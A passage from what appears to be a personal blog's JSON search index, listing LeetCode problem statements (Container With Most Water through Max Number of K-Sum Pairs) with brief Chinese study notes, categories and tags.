","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Breadth-First Search"]},{"title":"leetcode-11 - Container With Most Water","url":"/2021/07/leetcode-11/","content":"動機\n一開始以為要用stack，因為中間不用的柱子可以忽略掉，但是這樣沒辦法保留距離短但比較遠的柱子。\n\nProblem\nGiven n non-negative integers a1, a2, ..., an , where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of the line i is at (i, ai) and (i, 0). Find two lines, which, together with the x-axis forms a container, such that the container contains the most water.Notice that you may not slant the container. Example 1:Input: height = [1,8,6,2,5,4,8,3,7]Output: 49Explanation: The above vertical lines are represented by array [1,8,6,2,5,4,8,3,7]. In this case, the max area of water (blue section) the container can contain is 49.Example 2:Input: height = [1,1]Output: 1Example 3:Input: height = [4,3,2,1,4]Output: 16Example 4:Input: height = [1,2,1]Output: 2 Constraints:n == height.length2 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Two Pointers","Greedy"]},{"title":"leetcode-110 - Balanced Binary Tree","url":"/2021/07/leetcode-110/","content":"動機\n多回傳值的dfs\n\nProblem\nGiven a binary tree, determine if it is height-balanced.For this problem, a height-balanced binary tree is defined as:a binary tree in which the left and right subtrees of every node differ in height by no more than 1. Example 1:Input: root = [3,9,20,null,null,15,7]Output: trueExample 2:Input: root = [1,2,2,3,3,null,null,4,4]Output: falseExample 3:Input: root = []Output: true Constraints:The number of nodes in the tree is in the range [0, 5000].-104 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-111 - Minimum Depth of Binary Tree","url":"/2021/07/leetcode-111/","content":"動機\n複習dfs\n\nProblem\nGiven a binary tree, find its minimum depth.The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.Note: A leaf is a node with no children. Example 1:Input: root = [3,9,20,null,null,15,7]Output: 2Example 2:Input: root = [2,null,3,null,4,null,5,null,6]Output: 5 Constraints:The number of nodes in the tree is in the range [0, 105].-1000 ","categories":["Algorithm","Leetcode","60 questions to solve","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-112 - Path Sum","url":"/2021/07/leetcode-112/","content":"動機\n複習dfs\n\nProblem\nGiven the root of a binary tree and an integer targetSum, return true if the tree has a root-to-leaf path such that adding up all the values along the path equals targetSum.A leaf is a node with no children. Example 1:Input: root = [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum = 22Output: trueExample 2:Input: root = [1,2,3], targetSum = 5Output: falseExample 3:Input: root = [1,2], targetSum = 0Output: false Constraints:The number of nodes in the tree is in the range [0, 5000].-1000 ","categories":["Algorithm","Leetcode","60 questions to solve","seanprashad"],"tags":["Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-113 - Path Sum II","url":"/2021/07/leetcode-113/","content":"動機\n就base case特別一點的遞迴，要自己把最後一個加上去\n\nProblem\nGiven the root of a binary tree and an integer targetSum, return all root-to-leaf paths where each path's sum equals targetSum.A leaf is a node with no children. Example 1:Input: root = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22Output: [[5,4,11,2],[5,8,4,5]]Example 2:Input: root = [1,2,3], targetSum = 5Output: []Example 3:Input: root = [1,2], targetSum = 0Output: [] Constraints:The number of nodes in the tree is in the range [0, 5000].-1000 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Depth-First Search","Binary Tree","Tree","Backtracking"]},{"title":"leetcode-1137 - N-th Tribonacci Number","url":"/2021/07/leetcode-1137/","content":"動機\n複習fib\n\nProblem\nThe Tribonacci sequence Tn is defined as follows: T0 = 0, T1 = 1, T2 = 1, and Tn+3 = Tn + Tn+1 + Tn+2 for n >= 0.Given n, return the value of Tn. Example 1:Input: n = 4Output: 4Explanation:T_3 = 0 + 1 + 1 = 2T_4 = 1 + 1 + 2 = 4Example 2:Input: n = 25Output: 1389537 Constraints:0 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","Math","Memoization"]},{"title":"leetcode-114 - Flatten Binary Tree to Linked List","url":"/2021/07/leetcode-114/","content":"動機\npreorder的tree threading\n\nProblem\nGiven the root of a binary tree, flatten the tree into a linked list:The linked list should use the same TreeNode class where the right child pointer points to the next node in the list and the left child pointer is always null.The linked list should be in the same order as a pre-order traversal of the binary tree. Example 1:Input: root = [1,2,5,3,4,null,6]Output: [1,null,2,null,3,null,4,null,5,null,6]Example 2:Input: root = []Output: []Example 3:Input: root = [0]Output: [0] Constraints:The number of nodes in the tree is in the range [0, 2000].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Depth-First Search","Stack","Linked List","Binary Tree","Tree"]},{"title":"leetcode-116 - Populating Next Right Pointers in Each Node","url":"/2021/07/leetcode-116/","content":"動機\n畫裡面那一個橢圓，很有趣\n\nProblem\nYou are given a perfect binary tree where all leaves are on the same level, and every parent has two children. The binary tree has the following definition:struct Node {  int val;  Node *left;  Node *right;  Node *next;}Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL.Initially, all next pointers are set to NULL. Follow up:You may only use constant extra space.Recursive approach is fine, you may assume implicit stack space does not count as extra space for this problem. Example 1:Input: root = [1,2,3,4,5,6,7]Output: [1,#,2,3,#,4,5,6,7,#]Explanation: Given the above perfect binary tree (Figure A), your function should populate each next pointer to point to its next right node, just like in Figure B. The serialized output is in level order as connected by the next pointers, with '#' signifying the end of each level. Constraints:The number of nodes in the given tree is less than 4096.-1000 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-1172 - Dinner Plate Stacks","url":"/2021/07/leetcode-1172/","content":"動機\n直接把後面的空stack拿掉是關鍵\n\nProblem\nYou have an infinite number of stacks arranged in a row and numbered (left to right) from 0, each of the stacks has the same maximum capacity.Implement the DinnerPlates class:DinnerPlates(int capacity) Initializes the object with the maximum capacity of the stacks capacity.void push(int val) Pushes the given integer val into the leftmost stack with a size less than capacity.int pop() Returns the value at the top of the rightmost non-empty stack and removes it from that stack, and returns -1 if all the stacks are empty.int popAtStack(int index) Returns the value at the top of the stack with the given index index and removes it from that stack or returns -1 if the stack with that given index is empty. Example 1:Input[DinnerPlates, push, push, push, push, push, popAtStack, push, push, popAtStack, popAtStack, pop, pop, pop, pop, pop][[2], [1], [2], [3], [4], [5], [0], [20], [21], [0], [2], [], [], [], [], []]Output[null, null, null, null, null, null, 2, null, null, 20, 21, 5, 4, 3, 1, -1]Explanation: DinnerPlates D = DinnerPlates(2);  // Initialize with capacity = 2D.push(1);D.push(2);D.push(3);D.push(4);D.push(5);         // The stacks are now:  2  4                                           1  3  5                                           ï¹ ï¹ ï¹D.popAtStack(0);   // Returns 2.  The stacks are now:     4                                                       1  3  5                                                       ï¹ ï¹ ï¹D.push(20);        // The stacks are now: 20  4                                           1  3  5                                           ï¹ ï¹ ï¹D.push(21);        // The stacks are now: 20  4 21                                           1  3  5                                           ï¹ ï¹ ï¹D.popAtStack(0);   // Returns 20.  The stacks are now:     4 21                                                        1  3  5                                                        ï¹ ï¹ ï¹D.popAtStack(2);   // Returns 21.  The stacks are now:     4                                                        1  3  5                                                        ï¹ ï¹ ï¹ D.pop()            // Returns 5.  The stacks are now:      4                                                        1  3                                                         ï¹ ï¹  D.pop()            // Returns 4.  The stacks are now:   1  3                                                         ï¹ ï¹   D.pop()            // Returns 3.  The stacks are now:   1                                                         ï¹   D.pop()            // Returns 1.  There are no stacks.D.pop()            // Returns -1.  There are still no stacks. Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Stack","Design","Heap (Priority Queue)","Hash Table"]},{"title":"leetcode-118 - Pascal's Triangle","url":"/2021/07/leetcode-118/","content":"動機\n水題\n\nProblem\nGiven an integer numRows, return the first numRows of Pascal's triangle.In Pascal's triangle, each number is the sum of the two numbers directly above it as shown: Example 1:Input: numRows = 5Output: [[1],[1,1],[1,2,1],[1,3,3,1],[1,4,6,4,1]]Example 2:Input: numRows = 1Output: [[1]] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-124 - Binary Tree Maximum Path Sum","url":"/2021/07/leetcode-124/","content":"動機\n十分有趣\n\nProblem\nA path in a binary tree is a sequence of nodes where each pair of adjacent nodes in the sequence has an edge connecting them. A node can only appear in the sequence at most once. Note that the path does not need to pass through the root.The path sum of a path is the sum of the node's values in the path.Given the root of a binary tree, return the maximum path sum of any path. Example 1:Input: root = [1,2,3]Output: 6Explanation: The optimal path is 2 -> 1 -> 3 with a path sum of 2 + 1 + 3 = 6.Example 2:Input: root = [-10,9,20,null,null,15,7]Output: 42Explanation: The optimal path is 15 -> 20 -> 7 with a path sum of 15 + 20 + 7 = 42. Constraints:The number of nodes in the tree is in the range [1, 3 * 104].-1000 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-125 - Valid Palindrome","url":"/2021/07/leetcode-125/","content":"動機\n就回文\n\nProblem\nGiven a string s, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases. Example 1:Input: s = A man, a plan, a canal: PanamaOutput: trueExplanation: amanaplanacanalpanama is a palindrome.Example 2:Input: s = race a carOutput: falseExplanation: raceacar is not a palindrome. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","Blind Curated 75"],"tags":["String","Two Pointers"]},{"title":"leetcode-1275 - Find Winner on a Tic Tac Toe Game","url":"/2021/07/leetcode-1275/","content":"動機\n照著做\n\nProblem\nTic-tac-toe is played by two players A and B on a 3 x 3 grid.Here are the rules of Tic-Tac-Toe:Players take turns placing characters into empty squares ( ).The first player A always places X characters, while the second player B always places O characters.X and O characters are always placed into empty squares, never on filled ones.The game ends when there are 3 of the same (non-empty) character filling any row, column, or diagonal.The game also ends if all squares are non-empty.No more moves can be played if the game is over.Given an array moves where each element is another array of size 2 corresponding to the row and column of the grid where they mark their respective character in the order in which A and B play.Return the winner of the game if it exists (A or B), in case the game ends in a draw return Draw, if there are still movements to play return Pending.You can assume that moves is valid (It follows the rules of Tic-Tac-Toe), the grid is initially empty and A will play first. Example 1:Input: moves = [[0,0],[2,0],[1,1],[2,1],[2,2]]Output: AExplanation: A wins, he always plays first.X      X      X      X      X      ->     ->  X  ->  X  ->  X        O      O      OO     OOXExample 2:Input: moves = [[0,0],[1,1],[0,1],[0,2],[1,0],[2,0]]Output: BExplanation: B wins.X      X      XX     XXO    XXO    XXO    ->  O  ->  O  ->  O  -> XO  -> XO                                     O  Example 3:Input: moves = [[0,0],[1,1],[2,0],[1,0],[1,2],[2,1],[0,1],[0,2],[2,2]]Output: DrawExplanation: The game ends in a draw since there are no moves to make.XXOOOXXOXExample 4:Input: moves = [[0,0],[1,1]]Output: PendingExplanation: The game has not finished yet.X   O     Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Array","Matrix","Simulation","Hash Table"]},{"title":"leetcode-128 - Longest Consecutive Sequence","url":"/2021/07/leetcode-128/","content":"動機\n令人回想到73\n如果找不到範圍就先看看怎麼定義頭吧\n\nProblem\nGiven an unsorted array of integers nums, return the length of the longest consecutive elements sequence.You must write an algorithm that runs in O(n) time. Example 1:Input: nums = [100,4,200,1,3,2]Output: 4Explanation: The longest consecutive elements sequence is [1, 2, 3, 4]. Therefore its length is 4.Example 2:Input: nums = [0,3,7,2,5,8,4,6,0,1]Output: 9 Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Union Find","Hash Table"]},{"title":"leetcode-13 - Roman to Integer","url":"/2021/07/leetcode-13/","content":"動機\n水\n\nProblem\nRoman numerals are represented by seven different symbols: I, V, X, L, C, D and M.Symbol       ValueI             1V             5X             10L             50C             100D             500M             1000For example, 2 is written as II in Roman numeral, just two one's added together. 12 is written as XII, which is simply X + II. The number 27 is written as XXVII, which is XX + V + II.Roman numerals are usually written largest to smallest from left to right. However, the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used:I can be placed before V (5) and X (10) to make 4 and 9. X can be placed before L (50) and C (100) to make 40 and 90. C can be placed before D (500) and M (1000) to make 400 and 900.Given a roman numeral, convert it to an integer. Example 1:Input: s = IIIOutput: 3Example 2:Input: s = IVOutput: 4Example 3:Input: s = IXOutput: 9Example 4:Input: s = LVIIIOutput: 58Explanation: L = 50, V= 5, III = 3.Example 5:Input: s = MCMXCIVOutput: 1994Explanation: M = 1000, CM = 900, XC = 90 and IV = 4. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Math","Hash Table"]},{"title":"leetcode-130 - Surrounded Regions","url":"/2021/07/leetcode-130/","content":"動機\n複習dfs\n\nProblem\nGiven an m x n matrix board containing 'X' and 'O', capture all regions that are 4-directionally surrounded by 'X'.A region is captured by flipping all 'O's into 'X's in that surrounded region. Example 1:Input: board = [[X,X,X,X],[X,O,O,X],[X,X,O,X],[X,O,X,X]]Output: [[X,X,X,X],[X,X,X,X],[X,X,X,X],[X,O,X,X]]Explanation: Surrounded regions should not be on the border, which means that any 'O' on the border of the board are not flipped to 'X'. Any 'O' that is not on the border and it is not connected to an 'O' on the border will be flipped to 'X'. Two cells are connected if they are adjacent cells connected horizontally or vertically.Example 2:Input: board = [[X]]Output: [[X]] Constraints:m == board.lengthn == board[i].length1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Matrix","Union Find","Breadth-First Search","Depth-First Search"]},{"title":"leetcode-133 - Clone Graph","url":"/2021/07/leetcode-133/","content":"動機\n複習dfs\n\nProblem\nGiven a reference of a node in a connected undirected graph.Return a deep copy (clone) of the graph.Each node in the graph contains a value (int) and a list (List[Node]) of its neighbors.class Node {    public int val;    public List neighbors;} Test case format:For simplicity, each node's value is the same as the node's index (1-indexed). For example, the first node with val == 1, the second node with val == 2, and so on. The graph is represented in the test case using an adjacency list.An adjacency list is a collection of unordered lists used to represent a finite graph. Each list describes the set of neighbors of a node in the graph.The given node will always be the first node with val = 1. You must return the copy of the given node as a reference to the cloned graph. Example 1:Input: adjList = [[2,4],[1,3],[2,4],[1,3]]Output: [[2,4],[1,3],[2,4],[1,3]]Explanation: There are 4 nodes in the graph.1st node (val = 1)'s neighbors are 2nd node (val = 2) and 4th node (val = 4).2nd node (val = 2)'s neighbors are 1st node (val = 1) and 3rd node (val = 3).3rd node (val = 3)'s neighbors are 2nd node (val = 2) and 4th node (val = 4).4th node (val = 4)'s neighbors are 1st node (val = 1) and 3rd node (val = 3).Example 2:Input: adjList = [[]]Output: [[]]Explanation: Note that the input contains one empty list. The graph consists of only one node with val = 1 and it does not have any neighbors.Example 3:Input: adjList = []Output: []Explanation: This an empty graph, it does not have any nodes.Example 4:Input: adjList = [[2],[1]]Output: [[2],[1]] Constraints:The number of nodes in the graph is in the range [0, 100].1 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["Breadth-First Search","Depth-First Search","Hash Table","Graph"]},{"title":"leetcode-136 - Single Number","url":"/2021/07/leetcode-136/","content":"動機\nXOR!!\n\nProblem\nGiven a non-empty array of integers nums, every element appears twice except for one. Find that single one.You must implement a solution with a linear runtime complexity and use only constant extra space. Example 1:Input: nums = [2,2,1]Output: 1Example 2:Input: nums = [4,1,2,1,2]Output: 4Example 3:Input: nums = [1]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Array","Bit Manipulation"]},{"title":"leetcode-137 - Single Number II","url":"/2021/07/leetcode-137/","content":"動機\n是誰想到用bit去統計的\n\nProblem\nGiven an integer array nums where every element appears three times except for one, which appears exactly once. Find the single element and return it.You must implement a solution with a linear runtime complexity and use only constant extra space. Example 1:Input: nums = [2,2,3,2]Output: 3Example 2:Input: nums = [0,1,0,1,0,1,99]Output: 99 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Bit Manipulation"]},{"title":"leetcode-138 - Copy List with Random Pointer","url":"/2021/07/leetcode-138/","content":"動機\n這種copy有ptr的都要另外存新複製的node\n\nProblem\nA linked list of length n is given such that each node contains an additional random pointer, which could point to any node in the list, or null.Construct a deep copy of the list. The deep copy should consist of exactly n brand new nodes, where each new node has its value set to the value of its corresponding original node. Both the next and random pointer of the new nodes should point to new nodes in the copied list such that the pointers in the original list and copied list represent the same list state. None of the pointers in the new list should point to nodes in the original list.For example, if there are two nodes X and Y in the original list, where X.random --> Y, then for the corresponding two nodes x and y in the copied list, x.random --> y.Return the head of the copied linked list.The linked list is represented in the input/output as a list of n nodes. Each node is represented as a pair of [val, random_index] where:val: an integer representing Node.valrandom_index: the index of the node (range from 0 to n-1) that the random pointer points to, or null if it does not point to any node.Your code will only be given the head of the original linked list. Example 1:Input: head = [[7,null],[13,0],[11,4],[10,2],[1,0]]Output: [[7,null],[13,0],[11,4],[10,2],[1,0]]Example 2:Input: head = [[1,1],[2,1]]Output: [[1,1],[2,1]]Example 3:Input: head = [[3,null],[3,0],[3,null]]Output: [[3,null],[3,0],[3,null]]Example 4:Input: head = []Output: []Explanation: The given linked list is empty (null pointer), so return null. Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Linked List","Hash Table"]},{"title":"leetcode-139 - Word Break","url":"/2021/07/leetcode-139/","content":"動機\n不只一種dp\n\nProblem\nGiven a string s and a dictionary of strings wordDict, return true if s can be segmented into a space-separated sequence of one or more dictionary words.Note that the same word in the dictionary may be reused multiple times in the segmentation. Example 1:Input: s = leetcode, wordDict = [leet,code]Output: trueExplanation: Return true because leetcode can be segmented as leet code.Example 2:Input: s = applepenapple, wordDict = [apple,pen]Output: trueExplanation: Return true because applepenapple can be segmented as apple pen apple.Note that you are allowed to reuse a dictionary word.Example 3:Input: s = catsandog, wordDict = [cats,dog,sand,and,cat]Output: false Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","String","Hash Table","Trie","Memoization"]},{"title":"leetcode-14 - Longest Common Prefix","url":"/2021/07/leetcode-14/","content":"動機\n水\n\nProblem\nWrite a function to find the longest common prefix string amongst an array of strings.If there is no common prefix, return an empty string . Example 1:Input: strs = [flower,flow,flight]Output: flExample 2:Input: strs = [dog,racecar,car]Output: Explanation: There is no common prefix among the input strings. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String"]},{"title":"leetcode-140 - Word Break II","url":"/2021/07/leetcode-140/","content":"動機\n就是backtrack\n\nProblem\nGiven a string s and a dictionary of strings wordDict, add spaces in s to construct a sentence where each word is a valid dictionary word. Return all such possible sentences in any order.Note that the same word in the dictionary may be reused multiple times in the segmentation. Example 1:Input: s = catsanddog, wordDict = [cat,cats,and,sand,dog]Output: [cats and dog,cat sand dog]Example 2:Input: s = pineapplepenapple, wordDict = [apple,pen,applepen,pine,pineapple]Output: [pine apple pen apple,pineapple pen apple,pine applepen apple]Explanation: Note that you are allowed to reuse a dictionary word.Example 3:Input: s = catsandog, wordDict = [cats,dog,sand,and,cat]Output: [] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Dynamic Programming","String","Hash Table","Trie","Backtracking","Memoization"]},{"title":"leetcode-141 - Linked List Cycle","url":"/2021/07/leetcode-141/","content":"動機\n複習判圈\n\nProblem\nGiven head, the head of a linked list, determine if the linked list has a cycle in it.There is a cycle in a linked list if there is some node in the list that can be reached again by continuously following the next pointer. Internally, pos is used to denote the index of the node that tail's next pointer is connected to. Note that pos is not passed as a parameter.Return true if there is a cycle in the linked list. Otherwise, return false. Example 1:Input: head = [3,2,0,-4], pos = 1Output: trueExplanation: There is a cycle in the linked list, where the tail connects to the 1st node (0-indexed).Example 2:Input: head = [1,2], pos = 0Output: trueExplanation: There is a cycle in the linked list, where the tail connects to the 0th node.Example 3:Input: head = [1], pos = -1Output: falseExplanation: There is no cycle in the linked list. Constraints:The number of the nodes in the list is in the range [0, 104].-105 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Two Pointers","Linked List","Hash Table"]},{"title":"leetcode-142 - Linked List Cycle II","url":"/2021/07/leetcode-142/","content":"動機\n複習判圈與找loop起點\n\nProblem\nGiven a linked list, return the node where the cycle begins. If there is no cycle, return null.There is a cycle in a linked list if there is some node in the list that can be reached again by continuously following the next pointer. Internally, pos is used to denote the index of the node that tail's next pointer is connected to. Note that pos is not passed as a parameter.Notice that you should not modify the linked list. Example 1:Input: head = [3,2,0,-4], pos = 1Output: tail connects to node index 1Explanation: There is a cycle in the linked list, where tail connects to the second node.Example 2:Input: head = [1,2], pos = 0Output: tail connects to node index 0Explanation: There is a cycle in the linked list, where tail connects to the first node.Example 3:Input: head = [1], pos = -1Output: no cycleExplanation: There is no cycle in the linked list. Constraints:The number of the nodes in the list is in the range [0, 104].-105 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","seanprashad"],"tags":["Two Pointers","Linked List","Hash Table"]},{"title":"leetcode-143 - Reorder List","url":"/2021/07/leetcode-143/","content":"動機\n沒想到可以用reverse!!\n\nProblem\nYou are given the head of a singly linked-list. The list can be represented as:L0 → L1 → … → Ln - 1 → LnReorder the list to be on the following form:L0 → Ln → L1 → Ln - 1 → L2 → Ln - 2 → …You may not modify the values in the list's nodes. Only nodes themselves may be changed. Example 1:Input: head = [1,2,3,4]Output: [1,4,2,3]Example 2:Input: head = [1,2,3,4,5]Output: [1,5,2,4,3] Constraints:The number of nodes in the list is in the range [1, 5 * 104].1 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["Recursion","Stack","Two Pointers","Linked List"]},{"title":"leetcode-15 - 3Sum","url":"/2021/07/leetcode-15/","content":"動機\n複習3sum\n\nProblem\nGiven an integer array nums, return all the triplets [nums[i], nums[j], nums[k]] such that i != j, i != k, and j != k, and nums[i] + nums[j] + nums[k] == 0.Notice that the solution set must not contain duplicate triplets. Example 1:Input: nums = [-1,0,1,2,-1,-4]Output: [[-1,-1,2],[-1,0,1]]Example 2:Input: nums = []Output: []Example 3:Input: nums = [0]Output: [] Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Two Pointers","Sorting"]},{"title":"leetcode-150 - Evaluate Reverse Polish Notation","url":"/2021/07/leetcode-150/","content":"動機\n原來要用一般除法\n\nProblem\nEvaluate the value of an arithmetic expression in Reverse Polish Notation.Valid operators are +, -, *, and /. Each operand may be an integer or another expression.Note that division between two integers should truncate toward zero.It is guaranteed that the given RPN expression is always valid. That means the expression would always evaluate to a result, and there will not be any division by zero operation. Example 1:Input: tokens = [2,1,+,3,*]Output: 9Explanation: ((2 + 1) * 3) = 9Example 2:Input: tokens = [4,13,5,/,+]Output: 6Explanation: (4 + (13 / 5)) = 6Example 3:Input: tokens = [10,6,9,3,+,-11,*,/,*,17,+,5,+]Output: 22Explanation: ((10 * (6 / ((9 + 3) * -11))) + 17) + 5= ((10 * (6 / (12 * -11))) + 17) + 5= ((10 * (6 / -132)) + 17) + 5= ((10 * 0) + 17) + 5= (0 + 17) + 5= 17 + 5= 22 Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Stack","Math"]},{"title":"leetcode-152 - Maximum Product Subarray","url":"/2021/07/leetcode-152/","content":"動機\nLIS的進化版\n\nProblem\nGiven an integer array nums, find a contiguous non-empty subarray within the array that has the largest product, and return the product.It is guaranteed that the answer will fit in a 32-bit integer.A subarray is a contiguous subsequence of the array. Example 1:Input: nums = [2,3,-2,4]Output: 6Explanation: [2,3] has the largest product 6.Example 2:Input: nums = [-2,0,-1]Output: 0Explanation: The result cannot be 2, because [-2,-1] is not a subarray. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-153 - Find Minimum in Rotated Sorted Array","url":"/2021/07/leetcode-153/","content":"動機\n這題可以與33一起看，會有新的理解\n\nProblem\nSuppose an array of length n sorted in ascending order is rotated between 1 and n times. For example, the array nums = [0,1,2,4,5,6,7] might become:[4,5,6,7,0,1,2] if it was rotated 4 times.[0,1,2,4,5,6,7] if it was rotated 7 times.Notice that rotating an array [a[0], a[1], a[2], ..., a[n-1]] 1 time results in the array [a[n-1], a[0], a[1], a[2], ..., a[n-2]].Given the sorted rotated array nums of unique elements, return the minimum element of this array.You must write an algorithm that runs in O(log n) time. Example 1:Input: nums = [3,4,5,1,2]Output: 1Explanation: The original array was [1,2,3,4,5] rotated 3 times.Example 2:Input: nums = [4,5,6,7,0,1,2]Output: 0Explanation: The original array was [0,1,2,4,5,6,7] and it was rotated 4 times.Example 3:Input: nums = [11,13,15,17]Output: 11Explanation: The original array was [11,13,15,17] and it was rotated 4 times.  Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode","60 questions to solve","seanprashad","Blind Curated 75"],"tags":["Array","Binary Search"]},{"title":"leetcode-155 - Min Stack","url":"/2021/07/leetcode-155/","content":"動機\n複習minstk\n\nProblem\nDesign a stack that supports push, pop, top, and retrieving the minimum element in constant time.Implement the MinStack class:MinStack() initializes the stack object.void push(val) pushes the element val onto the stack.void pop() removes the element on the top of the stack.int top() gets the top element of the stack.int getMin() retrieves the minimum element in the stack. Example 1:Input[MinStack,push,push,push,getMin,pop,top,getMin][[],[-2],[0],[-3],[],[],[],[]]Output[null,null,null,null,-3,null,0,-2]ExplanationMinStack minStack = new MinStack();minStack.push(-2);minStack.push(0);minStack.push(-3);minStack.getMin(); // return -3minStack.pop();minStack.top();    // return 0minStack.getMin(); // return -2 Constraints:-231 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Stack","Design"]},{"title":"leetcode-1569 - Number of Ways to Reorder Array to Get Same BST","url":"/2021/07/leetcode-1569/","content":"動機\n很有趣的問題，原來python有可以直接算combination的函數…\n\nProblem\nGiven an array nums that represents a permutation of integers from 1 to n. We are going to construct a binary search tree (BST) by inserting the elements of nums in order into an initially empty BST. Find the number of different ways to reorder nums so that the constructed BST is identical to that formed from the original array nums.For example, given nums = [2,1,3], we will have 2 as the root, 1 as a left child, and 3 as a right child. The array [2,3,1] also yields the same BST but [3,2,1] yields a different BST.Return the number of ways to reorder nums such that the BST formed is identical to the original BST formed from nums.Since the answer may be very large, return it modulo 10^9 + 7. Example 1:Input: nums = [2,1,3]Output: 1Explanation: We can reorder nums to be [2,3,1] which will yield the same BST. There are no other ways to reorder nums which will yield the same BST.Example 2:Input: nums = [3,4,5,1,2]Output: 5Explanation: The following 5 arrays will yield the same BST: [3,1,2,4,5][3,1,4,2,5][3,1,4,5,2][3,4,1,2,5][3,4,1,5,2]Example 3:Input: nums = [1,2,3]Output: 0Explanation: There are no other orderings of nums that will yield the same BST.Example 4:Input: nums = [3,1,2,5,4,6]Output: 19Example 5:Input: nums = [9,4,2,1,3,6,5,7,8,14,11,10,12,13,16,15,17,18]Output: 216212978Explanation: The number of ways to reorder nums to get the same BST is 3216212999. Taking this number modulo 10^9 + 7 gives 216212978. Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","Array","Union Find","Math","Divide and Conquer","Binary Tree","Tree","Binary Search Tree","Memoization","Combinatorics"]},{"title":"leetcode-16 - 3Sum Closest","url":"/2021/07/leetcode-16/","content":"動機\n3sum的two ptr很重要\n\nProblem\nGiven an array nums of n integers and an integer target, find three integers in nums such that the sum is closest to target. Return the sum of the three integers. You may assume that each input would have exactly one solution. Example 1:Input: nums = [-1,2,1,-4], target = 1Output: 2Explanation: The sum that is closest to the target is 2. (-1 + 2 + 1 = 2). Constraints:3 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Two Pointers","Sorting"]},{"title":"leetcode-164 - Maximum Gap","url":"/2021/07/leetcode-164/","content":"動機\n\n忘了bucket sort\n在python用[0]*n通常下場都不好，要改用dict\nsort還是比較厲害\n\n\nProblem\nGiven an integer array nums, return the maximum difference between two successive elements in its sorted form. If the array contains less than two elements, return 0.You must write an algorithm that runs in linear time and uses linear extra space. Example 1:Input: nums = [3,6,9,1]Output: 3Explanation: The sorted form of the array is [1,3,6,9], either (3,6) or (6,9) has the maximum difference 3.Example 2:Input: nums = [10]Output: 0Explanation: The array contains less than 2 elements, therefore return 0. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Sorting","Bucket Sort","Radix Sort"]},{"title":"leetcode-1679 - Max Number of K-Sum Pairs","url":"/2021/07/leetcode-1679/","content":"動機\n在相等時不用煩惱該縮哪邊的two sum\n\nProblem\nYou are given an integer array nums and an integer k.In one operation, you can pick two numbers from the array whose sum equals k and remove them from the array.Return the maximum number of operations you can perform on the array. Example 1:Input: nums = [1,2,3,4], k = 5Output: 2Explanation: Starting with nums = [1,2,3,4]:- Remove numbers 1 and 4, then nums = [2,3]- Remove numbers 2 and 3, then nums = []There are no more pairs that sum up to 5, hence a total of 2 operations.Example 2:Input: nums = [3,1,3,4,3], k = 6Output: 1Explanation: Starting with nums = 